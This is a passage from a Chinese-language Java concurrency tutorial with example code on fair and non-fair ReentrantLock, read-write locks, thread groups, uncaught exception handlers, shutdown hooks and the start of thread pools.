class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="公平锁与非公平锁"><a href="#公平锁与非公平锁" class="headerlink" title="公平锁与非公平锁"></a>公平锁与非公平锁</h5><p>大多数情况下,锁的很强都是非公平的,如果线程1与线程2都在请求锁A,当锁A可用时,系统只是会从阻塞队列中随机的选择一个线程,不能保证其公平性</p>
<p>公平锁会按照时间先后顺序,保证先到先得,后到后得,公平锁的这一特点不会出现线程饥饿现象</p>
<p>synchronized是非公平锁,</p>
<p>ReentrantLock重入锁提供了一个构造方法:ReentrantLock(boolean fair),当在创建锁对象时实参传递true就可以把该锁设置为公平锁</p>
<p>如果是非公平锁,系统倾向于让一个线程再次获得已经持有的锁,这种分配策略是高效的,非公平的</p>
<p>如果是公平锁,多个线程不会发生同一个线程连续多次获得锁的可能,保证了公平性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test9</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Lock lock = <span class="keyword">new</span> ReentrantLock(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Runnable runnable = <span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        lock.lock();</span><br><span class="line"></span><br><span class="line">                        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;获得了锁对象&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        lock.unlock();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> Thread(runnable).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中个让线程获得锁对象的顺序一开始是什么样,之后就是不断的轮回</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220821012121602.png" alt="image-20220821012121602"></p>
<blockquote>
<p>公平锁看起来很公平,但是要实现公平锁必须要求系统维护一个有序队列,公平锁的实现成本较高,性能也较低,因此默认情况下锁是非公平的,不是特别的需求,一般不适用公平锁</p>
</blockquote>
<h5 id="ReentrantLock几个常用的方法"><a href="#ReentrantLock几个常用的方法" class="headerlink" title="ReentrantLock几个常用的方法"></a>ReentrantLock几个常用的方法</h5><h6 id="int-getHoldCount"><a href="#int-getHoldCount" class="headerlink" title="int getHoldCount()"></a>int getHoldCount()</h6><p>方法可以返回当前线程调用lock方法的次数</p>
<h6 id="int-getQueueLength"><a href="#int-getQueueLength" class="headerlink" title="int getQueueLength()"></a>int getQueueLength()</h6><p>返回正等待获得锁的线程<strong>预估数</strong></p>
<h6 id="int-getWaitQueueLength-Condition-condition"><a href="#int-getWaitQueueLength-Condition-condition" class="headerlink" title="int getWaitQueueLength(Condition condition)"></a>int getWaitQueueLength(Condition condition)</h6><p>返回与Condition相关的等待的线程预估数</p>
<h6 id="hasQueuedThread-Thread-thread"><a href="#hasQueuedThread-Thread-thread" class="headerlink" title="hasQueuedThread(Thread thread)"></a>hasQueuedThread(Thread thread)</h6><p>查询参数执行的线程是否在等待获得锁</p>
<h6 id="hasQueuedThreads"><a href="#hasQueuedThreads" class="headerlink" title="hasQueuedThreads()"></a>hasQueuedThreads()</h6><p>查询是否还有线程在等待获得该锁</p>
<h6 id="boolean-hasWaiters-Condition-condition"><a href="#boolean-hasWaiters-Condition-condition" class="headerlink" title="boolean hasWaiters(Condition condition)"></a>boolean hasWaiters(Condition condition)</h6><p>查询是否有线程正在等待指定的condition条件</p>
<h6 id="boolean-isFair"><a href="#boolean-isFair" class="headerlink" title="boolean isFair()"></a>boolean isFair()</h6><p>判断是否为公平锁</p>
<h6 id="boolean-isHeldByCurrentThread"><a href="#boolean-isHeldByCurrentThread" class="headerlink" title="boolean isHeldByCurrentThread()"></a>boolean isHeldByCurrentThread()</h6><p>判断当前线程是否持有该锁</p>
<h6 id="boolean-islocked"><a href="#boolean-islocked" class="headerlink" title="boolean islocked()"></a>boolean islocked()</h6><p>查询当前锁是否被线程持有,释放了锁对象后返回false</p>
<h4 id="ReentrantReadWriteLock读写锁"><a href="#ReentrantReadWriteLock读写锁" class="headerlink" title="ReentrantReadWriteLock读写锁"></a>ReentrantReadWriteLock读写锁</h4><p>synchronized内部锁与ReentrantLock锁都是独占锁(排它锁),同一时间只允许一个线程执行同步代码块,可以保证线程的安全性,但是执行效率低</p>
<p>ReentrantReadWriteLock读写锁是一种改进的排他锁,也可以称作共享/排他锁,允许多个线程同时读取共享数据,但是一次只允许一个线程对共享数据进行更新</p>
<p>读写锁通过读锁与写锁来完成读写操作,线程在读取共享数据前必须先持有读锁,该读锁可以被多个线程持有,即它是共享的,线程在修改共享数据前必须先持有写锁,写锁是排他的</p>
<p>读锁只是在读线程之间共享,任何一个线程持有读锁时,其他线程都无法获得写锁,保证了线程在读取数据期间没有其他线程对数据进行更新,使得读线程能够读到数据的最新值,保证在读数据期间共享变量不被修改</p>
<table>
<thead>
<tr>
<th>锁</th>
<th>获得条件</th>
<th>排他性</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>读锁</td>
<td>写锁未被任意线程持有</td>
<td>对读线程是共享的,对写线程是排他的</td>
<td>允许多个读线程可以同时读取共享数据,保证在读共享数据时,没有其他线程对共享数据进行修改</td>
</tr>
<tr>
<td>写锁</td>
<td>该写锁未被其他线程持有,并且响应的读锁也未被其他线程持有</td>
<td>对读线程和写线程都是排他的</td>
<td>保证写线程以独占的方式修改共享数据</td>
</tr>
</tbody></table>
<p>在java.util.concurrent.locks包中定义了ReadWriteLock接口,该接口中定义了readLock()返回读锁,定义writeLock()方法返回写锁,该接口的实现类是ReentrantReadWriteLock</p>
<p><strong>注意readLock()与writeLock()方法返回的锁对象是同一个锁的两个不同的角色,不是分别获得两个不同的锁</strong>,ReadWriteLock接口实例可以充当两个角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义读写锁</span></span><br><span class="line">ReadWriteLock rwLock=<span class="keyword">new</span> ReentrantReadWriteLock();</span><br><span class="line"><span class="comment">//获得读锁</span></span><br><span class="line">Lock readLock=rwLock.readLock();</span><br><span class="line"><span class="comment">//获得写锁</span></span><br><span class="line">Lock writeLock=rwLock.writeLock();</span><br></pre></td></tr></table></figure>

<h5 id="读读共享"><a href="#读读共享" class="headerlink" title="读读共享"></a>读读共享</h5><p>ReadWriteLock读写锁可以实现多个线程同时读取数据,即读读共享,可以提高程序的读取数据的效率</p>
<p>小例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span></span>&#123;</span><br><span class="line">        <span class="comment">//定义读写锁</span></span><br><span class="line">        ReadWriteLock readWriteLock=<span class="keyword">new</span> ReentrantReadWriteLock();</span><br><span class="line">        <span class="comment">//定义方法读取数据</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                readWriteLock.readLock().lock();</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;获得读锁&quot;</span>+System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">3</span>);<span class="comment">//模拟读取数据耗时</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                readWriteLock.readLock().unlock();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Service service=<span class="keyword">new</span> Service();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> Thread(() -&gt; service.read()).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220821143804836.png" alt="image-20220821143804836"></p>
<h5 id="写写互斥"><a href="#写写互斥" class="headerlink" title="写写互斥"></a>写写互斥</h5><p>小例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span></span>&#123;</span><br><span class="line">        <span class="comment">//定义读写锁</span></span><br><span class="line">        ReadWriteLock readWriteLock=<span class="keyword">new</span> ReentrantReadWriteLock();</span><br><span class="line">        <span class="comment">//定义方法模拟写数据</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                readWriteLock.writeLock().lock();</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;获得写锁&quot;</span>+System.currentTimeMillis());</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">3</span>);<span class="comment">//模拟读取数据耗时</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                readWriteLock.writeLock().unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Service service=<span class="keyword">new</span> Service();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> Thread(() -&gt; service.write()).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220821144443967.png" alt="image-20220821144443967"></p>
<p>等待上一个线程释放写锁之后下一个线程才能得到写锁</p>
<h5 id="读写互斥"><a href="#读写互斥" class="headerlink" title="读写互斥"></a>读写互斥</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span></span>&#123;</span><br><span class="line">        <span class="comment">//定义读写锁</span></span><br><span class="line">        ReadWriteLock readWriteLock=<span class="keyword">new</span> ReentrantReadWriteLock();</span><br><span class="line">        <span class="comment">//定义方法读取数据</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                readWriteLock.readLock().lock();</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;获得读锁&quot;</span>+System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">3</span>);<span class="comment">//模拟读取数据耗时</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                readWriteLock.readLock().unlock();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                readWriteLock.writeLock().lock();</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;获得写锁&quot;</span>+System.currentTimeMillis());</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">3</span>);<span class="comment">//模拟读取数据耗时</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                readWriteLock.writeLock().unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Service service=<span class="keyword">new</span> Service();</span><br><span class="line">            <span class="keyword">new</span> Thread(() -&gt; service.write()).start();</span><br><span class="line">            <span class="keyword">new</span> Thread(() -&gt; service.read()).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220821144933171.png" alt="image-20220821144933171"></p>
<p>等待上一个写线程执行完毕释放写锁之后才能获得读锁</p>
<h2 id="6-线程管理"><a href="#6-线程管理" class="headerlink" title="6.线程管理"></a>6.线程管理</h2><h4 id="线程组"><a href="#线程组" class="headerlink" title="线程组"></a>线程组</h4><p>在线程组中定义一组相关(相似)的线程,在线程组中也可以定义子线程组</p>
<p>Thread类有几个构造方法允许在创建线程时执行线程组,如果在创建线城时没有执行线程组,那么该线程就属于父线程所在的线程组</p>
<p>JVM在创建main线程时会为它指定一个线程组,因此每个Java线程组都有一个线程组与它关联,可以调用线程的getThreadGroup()方法返回线程组</p>
<p>线程组开始是出于安全的考虑设计用来区分不同的Applet,然而ThreadGroup并未实现这一目标,在新开发的系统中,已经不常用线程组了</p>
<h5 id="线程组创建"><a href="#线程组创建" class="headerlink" title="线程组创建"></a>线程组创建</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//返回当前main线程的线程组</span></span><br><span class="line">        ThreadGroup mainGroup=Thread.currentThread().getThreadGroup();</span><br><span class="line">        System.out.println(mainGroup);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//定义线程组,如果不指定所属线程组,则自动归属到当前线程所属的线程组中</span></span><br><span class="line">        ThreadGroup group1=<span class="keyword">new</span> ThreadGroup(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">        System.out.println(group1);</span><br><span class="line">        System.out.println(group1.getParent()==mainGroup);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//定义线程组,同时指定父线程组</span></span><br><span class="line">        ThreadGroup group2=<span class="keyword">new</span> ThreadGroup(mainGroup,<span class="string">&quot;group2&quot;</span>);</span><br><span class="line">        System.out.println(group2.getParent()==mainGroup);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//创建线程时不指定线程组</span></span><br><span class="line">        Runnable r=<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(Thread.currentThread());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Thread t1=<span class="keyword">new</span> Thread(r,<span class="string">&quot;t1&quot;</span>);</span><br><span class="line">        System.out.println(t1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建线程时指定线程组</span></span><br><span class="line">        Thread t2=<span class="keyword">new</span> Thread(group1,r,<span class="string">&quot;t2&quot;</span>);</span><br><span class="line">        System.out.println(t2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220821152550460.png" alt="image-20220821152550460"></p>
<h5 id="线程组的基本操作"><a href="#线程组的基本操作" class="headerlink" title="线程组的基本操作"></a>线程组的基本操作</h5><p>activeCount()返回当前线程组及子线程组中活动该线程的数量(近似)</p>
<p>activeGroupCount()返回当前线程组及子线程组中活动线程组的数量(近似值)</p>
<p>int enumerate(Thread[] list)将当前线程组中的活动线程复制到参数数组中</p>
<p>getMaxPriority()返回线程组的最大优先级,默认为10</p>
<p>getName()返回线程组名称</p>
<p>getParent()返回父线程组</p>
<p>interrupt()中断线程组中所有的线程</p>
<p>setDaemon(boolean daemon)设置线程组为守护线程组</p>
<p>isDaemon()判断当前线程组是否为守护线程组</p>
<p>list()将当前线程组中的活动线程打印出来</p>
<p>parentOf(ThreadGroup g)判断当前线程组是否为参数线程组的父线程组</p>
<h5 id="复制线程组中的线程及子线程组"><a href="#复制线程组中的线程及子线程组" class="headerlink" title="复制线程组中的线程及子线程组"></a>复制线程组中的线程及子线程组</h5><p>enumerate(Thread[] list)把当前线程组合子线程组中所有的线程复制到参数数组中</p>
<p>enumerate(Thread[] list，boolean recurse)第二个参数设置为false,则只复制当前线程组的子线程组</p>
<h5 id="线程组的批量中断"><a href="#线程组的批量中断" class="headerlink" title="线程组的批量中断"></a>线程组的批量中断</h5><p>线程组的interrupt()方法可以给该线程组中所有的活动线程添加中断标志</p>
<h5 id="设置守护线程组"><a href="#设置守护线程组" class="headerlink" title="设置守护线程组"></a>设置守护线程组</h5><p>守护线程是为其他线程提供服务的,当JVM中只有守护线程时,守护线程会自动销毁,JVM会退出</p>
<p>调用线程组的setDaemon(true)可以把线程组设置为守护线程组,<strong>当守护线程组中没有任何活动线程时,守护线程组会自动销毁</strong></p>
<p>注意线程组的守护属性,不影响线程组中线程的守护属性,或者说守护线程组中的线程可以是非守护线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//先定义线程组</span></span><br><span class="line">        ThreadGroup group=<span class="keyword">new</span> ThreadGroup(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">        <span class="comment">//设置线程组为守护线程组</span></span><br><span class="line">        group.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//向组中添加3个线程</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> Thread(group, <span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">20</span>; j++) &#123;</span><br><span class="line">                        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;---&quot;</span>+j);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            Thread.sleep(<span class="number">500</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">        Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;main线程结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子中,main线程5秒结束,守护线程组中的非守护线程需要10秒结束,在main线程结束后,他们还是继续运行,直到三个线程都结束,守护线程组才自动销毁</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220821160517628.png" alt="image-20220821160517628"></p>
<h4 id="捕获线程的执行异常"><a href="#捕获线程的执行异常" class="headerlink" title="捕获线程的执行异常"></a>捕获线程的执行异常</h4><p>在线程的run()方法中,如果有受检异常必须进行捕获处理,如果想要获得run()方法中出现的运行时异常信息,可以通回调UncaughtExceptionHandler接口获得哪个线程出现了运行时异常,在Thread类中有关处理运行异常的方法有:</p>
<p><code>getDefultUncaughtExceptionHandler()</code>获得全局的(默认的)UncaughtExceptionHandler</p>
<p><code>getUncaughtExceptionHandler()</code>获得当前线程的UncaughtExceptionHandler</p>
<p><code>setDefultUncaughtExceptionHandler()</code>设置全局的UncaughtExceptionHandler</p>
<p><code>setUncaughtExceptionHandler()</code>设置当前线程的UncaughtExceptionHandler</p>
<h5 id="设置全局线程异常的回调接口"><a href="#设置全局线程异常的回调接口" class="headerlink" title="设置全局线程异常的回调接口"></a>设置全局线程异常的回调接口</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//设置线程异常全局的回调接口</span></span><br><span class="line">        Thread.setDefaultUncaughtExceptionHandler(<span class="keyword">new</span> Thread.UncaughtExceptionHandler()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">uncaughtException</span><span class="params">(Thread t, Throwable e)</span> </span>&#123;</span><br><span class="line">                System.out.println(t.getName()+<span class="string">&quot;产生了异常:&quot;</span>+e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Thread t1=<span class="keyword">new</span> Thread(() -&gt; System.out.println(<span class="number">10</span>/<span class="number">0</span>));</span><br><span class="line">        t1.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220822151634663.png" alt="image-20220822151634663"></p>
<p>如果设置了自己线程的UncaughtExceptionHandler就就调用自己的UncaughtExceptionHandler</p>
<p>没有则调用看全局UncaughtExceptionHandler</p>
<p>全局也没有就直接把异常栈信息定向到System.err中</p>
<h5 id="注入Hook钩子线程"><a href="#注入Hook钩子线程" class="headerlink" title="注入Hook钩子线程"></a>注入Hook钩子线程</h5><p>现在很多软件包括MySql,Zookeeper,kafka等都存在Hook线程的校验机制,目的是校验进程是否已启动,防止重复启动程序</p>
<p>Hook线程也称为钩子线程,当JVM退出的时候会执行Hook线程,经常在程序启动的时候创建一个.lock文件,用.lock文件校验程序是否启动,在程序退出(JVM退出)时删除该.lock文件,在Hook线程中除了防止重新启动进程外,还可以做资源释放</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.注入Hook线程,在程序退出时删除.lock文件</span></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;JVM退出,会启动柜当前hook线程,在hook线程中删除.lock文件&quot;</span>);</span><br><span class="line">                getLockFile().toFile().delete();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">        <span class="comment">//2.程序运行时,检查.lock文件是否存在,如果存在,则抛出异常</span></span><br><span class="line">        <span class="keyword">if</span>(getLockFile().toFile().exists())&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;程序已启动&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                getLockFile().toFile().createNewFile();</span><br><span class="line">                System.out.println(<span class="string">&quot;程序启动并创建了.lock文件&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//模拟程序运行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;程序运行中----&quot;</span>);</span><br><span class="line">                TimeUnit.SECONDS.sleep(<span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Path <span class="title">getLockFile</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Paths.get(<span class="string">&quot;&quot;</span>,<span class="string">&quot;tmp.lock&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220822154013314.png" alt="image-20220822154013314"></p>
<p>如果.lock文件没有删除运行则报错</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220822154050264.png" alt="image-20220822154050264"></p>
<h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><h5 id="什么是线程池"><a href="#什么是线程池" class="headerlink" title="什么是线程池"></a>什么是线程池</h5><p>线程池内部可以预先创建一定数量的工作线程,客户端代码直接将任务作为一个对象提交给线程池,线程池将这些任务缓存在工作队列中,线程池中的工作线程不断地从队列中取出任务</p>
<h5 id="JDK对线程池的支持"><a href="#JDK对线程池的支持" class="headerlink" title="JDK对线程池的支持"></a>JDK对线程池的支持</h5><p>JDK提供了一套Executor框架,可以帮助开发人员有效的使用线程池</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220822160953591.png" alt="image-20220822160953591"></p>
<h5 id="线程池的基本使用"><a href="#线程池的基本使用" class="headerlink" title="线程池的基本使用"></a>线程池的基本使用</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建有5个线程大小的线程池</span></span><br><span class="line">        ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//向线程池中提交18个任务</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++) &#123;</span><br><span class="line">            executorService.execute(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getId()+<span class="string">&quot;号任务正在执行任务,开始时间:&quot;</span>+System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            